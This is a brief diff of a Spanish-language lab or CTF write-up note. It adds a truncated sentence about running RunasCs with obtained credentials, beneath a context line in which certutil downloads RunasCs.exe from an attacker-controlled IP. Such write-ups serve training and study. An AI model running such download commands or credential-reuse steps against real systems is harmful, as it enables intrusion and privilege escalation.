@@ -101,7 +101,7 @@ certutil.exe -urlcache -split -f "http://10.10.14.64/RunasCs.exe" ".\RunasCs.exe
 ![[Pasted image 20240311182044.png]]
 
 ### RunasCs.exe
-
+ejecutamos RunasCs con las credenciales que hemos conse
 ![[Pasted image 20240311182556.png]]
 
 
